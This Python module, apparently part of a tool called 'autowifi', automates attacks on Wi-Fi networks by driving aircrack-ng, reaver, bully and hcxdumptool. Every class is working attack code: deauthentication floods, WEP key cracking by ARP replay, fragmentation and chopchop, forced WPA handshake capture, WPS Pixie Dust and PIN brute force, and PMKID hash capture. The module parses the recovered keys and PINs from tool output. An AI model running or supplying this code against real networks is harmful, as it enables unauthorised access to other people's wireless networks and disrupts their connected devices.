import subprocess
import os
import re
import time
import signal
import tempfile
from dataclasses import dataclass, field
from enum import Enum
from threading import Thread, Event


class AttackType(Enum):
    DEAUTH = "deauth"
    WEP_ARP_REPLAY = "wep_arp"
    WEP_FRAGMENT = "wep_frag"
    WEP_CHOPCHOP = "wep_chop"
    WPA_HANDSHAKE = "wpa_hs"
    WPS_PIXIE = "wps_pixie"
    WPS_BRUTE = "wps_brute"
    PMKID = "pmkid"
    AUTO = "auto"


@dataclass
class AttackResult:
    success: bool
    attack_type: str
    target_bssid: str
    target_essid: str
    key: str = ""
    pin: str = ""
    handshake_file: str = ""
    pmkid_file: str = ""
    duration: float = 0
    iv_count: int = 0
    details: dict = field(default_factory=dict)


def _run(cmd, timeout=30):
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return result.stdout, result.stderr, result.returncode
    except subprocess.TimeoutExpired:
        return "", "timeout", 1
    except FileNotFoundError:
        return "", f"{cmd[0]} not found", 127


class Deauth:
    def __init__(self, interface, bssid, client=None, count=10):
        self.interface = interface
        self.bssid = bssid
        self.client = client
        self.count = count
        self._process = None

    def run(self):
        cmd = [
            "aireplay-ng", "--deauth", str(self.count),
            "-a", self.bssid,
        ]
        if self.client:
            cmd.extend(["-c", self.client])
        cmd.append(self.interface)

        self._process = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
        )

    def run_continuous(self):
        cmd = [
            "aireplay-ng", "--deauth", "0",
            "-a", self.bssid,
        ]
        if self.client:
            cmd.extend(["-c", self.client])
        cmd.append(self.interface)

        self._process = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
        )

    def stop(self):
        if self._process and self._process.poll() is None:
            self._process.send_signal(signal.SIGTERM)
            try:
                self._process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._process.kill()

    def wait(self, timeout=None):
        if self._process:
            self._process.wait(timeout=timeout)


class WEPAttack:
    def __init__(self, interface, bssid, channel, essid="", client=None, output_dir=None):
        self.interface = interface
        self.bssid = bssid
        self.channel = channel
        self.essid = essid
        self.client = client
        self.output_dir = output_dir or tempfile.mkdtemp(prefix="awf_wep_")
        self._processes = []
        self._stop_event = Event()

    def _start_capture(self, prefix):
        cmd = [
            "airodump-ng",
            "--bssid", self.bssid,
            "--channel", str(self.channel),
            "--write", prefix,
            "--output-format", "pcap,csv",
            self.interface,
        ]
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self._processes.append(proc)
        return proc

    def arp_replay(self, timeout=600):
        start = time.time()
        prefix = os.path.join(self.output_dir, "wep_arp")
        self._start_capture(prefix)
        time.sleep(3)

        fake_auth_cmd = [
            "aireplay-ng", "-1", "6000",
            "-e", self.essid if self.essid else "",
            "-a", self.bssid,
            "-h", self._get_our_mac(),
            self.interface,
        ]
        fake_proc = subprocess.Popen(
            fake_auth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        self._processes.append(fake_proc)
        time.sleep(2)

        replay_cmd = [
            "aireplay-ng", "-3",
            "-b", self.bssid,
            "-h", self._get_our_mac(),
            self.interface,
        ]
        replay_proc = subprocess.Popen(
            replay_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
        )
        self._processes.append(replay_proc)

        cap_file = prefix + "-01.cap"
        while time.time() - start < timeout and not self._stop_event.is_set():
            time.sleep(10)
            result = self._try_crack(cap_file)
            if result and result.success:
                self.stop()
                result.duration = time.time() - start
                return result

        self.stop()
        return AttackResult(
            success=False, attack_type="wep_arp",
            target_bssid=self.bssid, target_essid=self.essid,
            duration=time.time() - start,
        )

    def fragmentation(self, timeout=600):
        start = time.time()
        prefix = os.path.join(self.output_dir, "wep_frag")
        self._start_capture(prefix)
        time.sleep(3)

        fake_auth_cmd = [
            "aireplay-ng", "-1", "60",
            "-e", self.essid if self.essid else "",
            "-a", self.bssid,
            "-h", self._get_our_mac(),
            self.interface,
        ]
        fake_proc = subprocess.Popen(
            fake_auth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        self._processes.append(fake_proc)
        time.sleep(2)

        frag_cmd = [
            "aireplay-ng", "-5",
            "-b", self.bssid,
            "-h", self._get_our_mac(),
            self.interface,
        ]
        frag_proc = subprocess.Popen(
            frag_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, stdin=subprocess.PIPE,
        )
        self._processes.append(frag_proc)

        try:
            frag_proc.stdin.write("y\n")
            frag_proc.stdin.flush()
        except (BrokenPipeError, OSError):
            pass

        xor_file = None
        frag_start = time.time()
        while time.time() - frag_start < 120 and not self._stop_event.is_set():
            time.sleep(5)
            for f in os.listdir(self.output_dir):
                if f.endswith(".xor"):
                    xor_file = os.path.join(self.output_dir, f)
                    break
            if xor_file:
                break

        if not xor_file:
            self.stop()
            return AttackResult(
                success=False, attack_type="wep_frag",
                target_bssid=self.bssid, target_essid=self.essid,
                duration=time.time() - start,
            )

        inject_cap = os.path.join(self.output_dir, "inject.cap")
        forge_cmd = [
            "packetforge-ng", "-0",
            "-a", self.bssid,
            "-h", self._get_our_mac(),
            "-l", "192.168.1.100",
            "-k", "192.168.1.255",
            "-y", xor_file,
            "-w", inject_cap,
        ]
        _run(forge_cmd, timeout=30)

        if os.path.exists(inject_cap):
            inject_cmd = [
                "aireplay-ng", "-2",
                "-r", inject_cap,
                self.interface,
            ]
            inject_proc = subprocess.Popen(
                inject_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                stdin=subprocess.PIPE,
            )
            self._processes.append(inject_proc)
            try:
                inject_proc.stdin.write(b"y\n")
                inject_proc.stdin.flush()
            except (BrokenPipeError, OSError):
                pass

        cap_file = prefix + "-01.cap"
        while time.time() - start < timeout and not self._stop_event.is_set():
            time.sleep(10)
            result = self._try_crack(cap_file)
            if result and result.success:
                self.stop()
                result.duration = time.time() - start
                return result

        self.stop()
        return AttackResult(
            success=False, attack_type="wep_frag",
            target_bssid=self.bssid, target_essid=self.essid,
            duration=time.time() - start,
        )

    def chopchop(self, timeout=600):
        start = time.time()
        prefix = os.path.join(self.output_dir, "wep_chop")
        self._start_capture(prefix)
        time.sleep(3)

        fake_auth_cmd = [
            "aireplay-ng", "--fakeauth", "0",
            "-a", self.bssid,
            "-h", self._get_our_mac(),
            self.interface,
        ]
        _run(fake_auth_cmd, timeout=30)

        chop_cmd = [
            "aireplay-ng", "-4",
            "-b", self.bssid,
            "-h", self._get_our_mac(),
            self.interface,
        ]
        chop_proc = subprocess.Popen(
            chop_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, stdin=subprocess.PIPE,
        )
        self._processes.append(chop_proc)

        try:
            chop_proc.stdin.write("y\n")
            chop_proc.stdin.flush()
        except (BrokenPipeError, OSError):
            pass

        xor_file = None
        chop_start = time.time()
        while time.time() - chop_start < 180 and not self._stop_event.is_set():
            time.sleep(5)
            for f in os.listdir(self.output_dir):
                if f.endswith(".xor"):
                    xor_file = os.path.join(self.output_dir, f)
                    break
            if xor_file:
                break

        if not xor_file:
            self.stop()
            return AttackResult(
                success=False, attack_type="wep_chop",
                target_bssid=self.bssid, target_essid=self.essid,
                duration=time.time() - start,
            )

        forged = os.path.join(self.output_dir, "forged.cap")
        forge_cmd = [
            "packetforge-ng", "-0",
            "-a", self.bssid,
            "-h", self._get_our_mac(),
            "-k", "255.255.255.255",
            "-l", "255.255.255.255",
            "-y", xor_file,
            "-w", forged,
        ]
        _run(forge_cmd, timeout=30)

        if os.path.exists(forged):
            inject_cmd = [
                "aireplay-ng", "-2",
                "-r", forged,
                self.interface,
            ]
            inject_proc = subprocess.Popen(
                inject_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                stdin=subprocess.PIPE,
            )
            self._processes.append(inject_proc)
            try:
                inject_proc.stdin.write(b"y\n")
                inject_proc.stdin.flush()
            except (BrokenPipeError, OSError):
                pass

        cap_file = prefix + "-01.cap"
        while time.time() - start < timeout and not self._stop_event.is_set():
            time.sleep(10)
            result = self._try_crack(cap_file)
            if result and result.success:
                self.stop()
                result.duration = time.time() - start
                return result

        self.stop()
        return AttackResult(
            success=False, attack_type="wep_chop",
            target_bssid=self.bssid, target_essid=self.essid,
            duration=time.time() - start,
        )

    def _try_crack(self, cap_file):
        if not os.path.exists(cap_file):
            return None
        stdout, _, rc = _run(["aircrack-ng", "-0", cap_file], timeout=60)
        match = re.search(r"KEY FOUND!\s*\[\s*([0-9A-Fa-f: ]+)\s*\]", stdout)
        if match:
            key = match.group(1).replace(":", "").replace(" ", "")
            return AttackResult(
                success=True, attack_type="wep",
                target_bssid=self.bssid, target_essid=self.essid,
                key=key, handshake_file=cap_file,
            )
        return None

    def _get_our_mac(self):
        from autowifi.interface import get_mac
        return get_mac(self.interface)

    def stop(self):
        self._stop_event.set()
        for proc in self._processes:
            if proc.poll() is None:
                proc.send_signal(signal.SIGTERM)
                try:
                    proc.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    proc.kill()
        self._processes.clear()


class WPAAttack:
    def __init__(self, interface, bssid, channel, essid="", clients=None, output_dir=None):
        self.interface = interface
        self.bssid = bssid
        self.channel = channel
        self.essid = essid
        self.clients = clients or []
        self.output_dir = output_dir or tempfile.mkdtemp(prefix="awf_wpa_")
        self._processes = []
        self._stop_event = Event()
        self._handshake_captured = Event()

    def capture_handshake(self, deauth_count=15, timeout=180, deauth_interval=10):
        from autowifi.handshake import HandshakeCapture, verify_handshake
        start = time.time()

        capture = HandshakeCapture(self.interface, self.bssid, self.channel, self.output_dir)
        capture.start()
        time.sleep(3)

        deauth_round = 0
        while time.time() - start < timeout and not self._stop_event.is_set():
            if capture.is_captured:
                capture.stop()
                return AttackResult(
                    success=True, attack_type="wpa_hs",
                    target_bssid=self.bssid, target_essid=self.essid,
                    handshake_file=capture.cap_file,
                    duration=time.time() - start,
                )

            if deauth_round == 0 or (time.time() - start) > deauth_round * deauth_interval:
                deauth_round += 1
                targets = self.clients if self.clients else [None]
                for client in targets[:5]:
                    client_mac = client.mac if client else None
                    deauth = Deauth(self.interface, self.bssid, client_mac, deauth_count)
                    deauth.run()

            time.sleep(2)

        cap_file = capture.cap_file
        capture.stop()

        if os.path.exists(cap_file) and verify_handshake(cap_file, self.bssid):
            return AttackResult(
                success=True, attack_type="wpa_hs",
                target_bssid=self.bssid, target_essid=self.essid,
                handshake_file=cap_file,
                duration=time.time() - start,
            )

        return AttackResult(
            success=False, attack_type="wpa_hs",
            target_bssid=self.bssid, target_essid=self.essid,
            duration=time.time() - start,
        )

    def stop(self):
        self._stop_event.set()
        for proc in self._processes:
            if proc.poll() is None:
                proc.send_signal(signal.SIGTERM)
                try:
                    proc.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    proc.kill()
        self._processes.clear()


class WPSAttack:
    def __init__(self, interface, bssid, channel, essid="", output_dir=None):
        self.interface = interface
        self.bssid = bssid
        self.channel = channel
        self.essid = essid
        self.output_dir = output_dir or tempfile.mkdtemp(prefix="awf_wps_")
        self._process = None
        self._stop_event = Event()

    def pixie_dust(self, timeout=300):
        start = time.time()

        cmd = [
            "reaver",
            "-i", self.interface,
            "-b", self.bssid,
            "-c", str(self.channel),
            "-K", "1",
            "-vv",
        ]

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            output = result.stdout + result.stderr
            return self._parse_reaver_output(output, "wps_pixie", time.time() - start)
        except subprocess.TimeoutExpired:
            pass

        cmd_bully = [
            "bully",
            self.interface,
            "-b", self.bssid,
            "-c", str(self.channel),
            "-d", "-v", "3",
        ]

        try:
            result = subprocess.run(cmd_bully, capture_output=True, text=True, timeout=timeout)
            output = result.stdout + result.stderr
            return self._parse_bully_output(output, "wps_pixie", time.time() - start)
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass

        return AttackResult(
            success=False, attack_type="wps_pixie",
            target_bssid=self.bssid, target_essid=self.essid,
            duration=time.time() - start,
        )

    def brute_force(self, timeout=3600, pin=None):
        start = time.time()

        cmd = [
            "reaver",
            "-i", self.interface,
            "-b", self.bssid,
            "-c", str(self.channel),
            "-vv", "-N",
        ]

        if pin:
            cmd.extend(["-p", pin])

        try:
            self._process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
            )

            output_lines = []
            while not self._stop_event.is_set():
                line = self._process.stdout.readline()
                if not line:
                    break
                output_lines.append(line)

                if "WPS PIN:" in line or "WPA PSK:" in line:
                    output = "\n".join(output_lines)
                    self._process.terminate()
                    return self._parse_reaver_output(output, "wps_brute", time.time() - start)

                if time.time() - start > timeout:
                    break

            self._process.terminate()
        except FileNotFoundError:
            pass

        return AttackResult(
            success=False, attack_type="wps_brute",
            target_bssid=self.bssid, target_essid=self.essid,
            duration=time.time() - start,
        )

    def _parse_reaver_output(self, output, attack_type, duration):
        pin_match = re.search(r"WPS PIN:\s*'?(\d+)'?", output)
        psk_match = re.search(r"WPA PSK:\s*'(.+?)'", output)

        pin = pin_match.group(1) if pin_match else ""
        key = psk_match.group(1) if psk_match else ""

        return AttackResult(
            success=bool(pin or key),
            attack_type=attack_type,
            target_bssid=self.bssid,
            target_essid=self.essid,
            key=key, pin=pin,
            duration=duration,
        )

    def _parse_bully_output(self, output, attack_type, duration):
        pin_match = re.search(r"Pin:\s*(\d+)", output)
        psk_match = re.search(r"Pass(?:word|phrase):\s*(.+)", output)

        pin = pin_match.group(1) if pin_match else ""
        key = psk_match.group(1).strip() if psk_match else ""

        return AttackResult(
            success=bool(pin or key),
            attack_type=attack_type,
            target_bssid=self.bssid,
            target_essid=self.essid,
            key=key, pin=pin,
            duration=duration,
        )

    def stop(self):
        self._stop_event.set()
        if self._process and self._process.poll() is None:
            self._process.send_signal(signal.SIGTERM)
            try:
                self._process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._process.kill()


class PMKIDAttack:
    def __init__(self, interface, bssid, channel, essid="", output_dir=None):
        self.interface = interface
        self.bssid = bssid
        self.channel = channel
        self.essid = essid
        self.output_dir = output_dir or tempfile.mkdtemp(prefix="awf_pmkid_")
        self._process = None
        self._stop_event = Event()

    def capture(self, timeout=60):
        start = time.time()
        pcapng_file = os.path.join(self.output_dir, "pmkid.pcapng")

        filter_file = os.path.join(self.output_dir, "filter.txt")
        with open(filter_file, "w") as f:
            bssid_clean = self.bssid.replace(":", "").lower()
            f.write(f"{bssid_clean}\n")

        cmd = [
            "hcxdumptool",
            "-i", self.interface,
            "-o", pcapng_file,
            "--filterlist_ap=" + filter_file,
            "--filtermode=2",
            "--enable_status=1",
        ]

        self._process = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
        )

        captured = False
        while time.time() - start < timeout and not self._stop_event.is_set():
            if self._process.poll() is not None:
                break
            try:
                line = self._process.stdout.readline()
                if "PMKID" in line or "FOUND PMKID" in line.upper():
                    captured = True
                    break
            except (ValueError, OSError):
                break

        if self._process.poll() is None:
            self._process.send_signal(signal.SIGTERM)
            try:
                self._process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._process.kill()

        if not os.path.exists(pcapng_file):
            return AttackResult(
                success=False, attack_type="pmkid",
                target_bssid=self.bssid, target_essid=self.essid,
                duration=time.time() - start,
            )

        hash_file = os.path.join(self.output_dir, "pmkid.hc22000")
        convert_cmd = ["hcxpcapngtool", "-o", hash_file, pcapng_file]
        stdout, _, rc = _run(convert_cmd, timeout=30)

        if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
            return AttackResult(
                success=True, attack_type="pmkid",
                target_bssid=self.bssid, target_essid=self.essid,
                pmkid_file=hash_file,
                duration=time.time() - start,
            )

        return AttackResult(
            success=False, attack_type="pmkid",
            target_bssid=self.bssid, target_essid=self.essid,
            duration=time.time() - start,
        )

    def stop(self):
        self._stop_event.set()
        if self._process and self._process.poll() is None:
            self._process.send_signal(signal.SIGTERM)
            try:
                self._process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._process.kill()


def get_recommended_attacks(network):
    attacks = []
    if network.is_wep:
        attacks.extend([
            (AttackType.WEP_ARP_REPLAY, "WEP ARP Replay", "Fast IV collection via ARP replay"),
            (AttackType.WEP_FRAGMENT, "WEP Fragmentation", "Fragmentation-based keystream recovery"),
            (AttackType.WEP_CHOPCHOP, "WEP ChopChop", "KoreK chopchop keystream extraction"),
        ])
    elif network.is_wpa:
        attacks.extend([
            (AttackType.PMKID, "PMKID Capture", "Clientless WPA key extraction"),
            (AttackType.WPA_HANDSHAKE, "WPA Handshake", "Deauth + 4-way handshake capture"),
        ])
        if network.wps and not network.wps_locked:
            attacks.insert(0, (AttackType.WPS_PIXIE, "WPS Pixie Dust", "Offline WPS PIN recovery"))
            attacks.append((AttackType.WPS_BRUTE, "WPS Brute Force", "Online WPS PIN enumeration"))
    elif network.is_open:
        attacks.append((AttackType.DEAUTH, "Deauth Only", "Client deauthentication"))

    return attacks
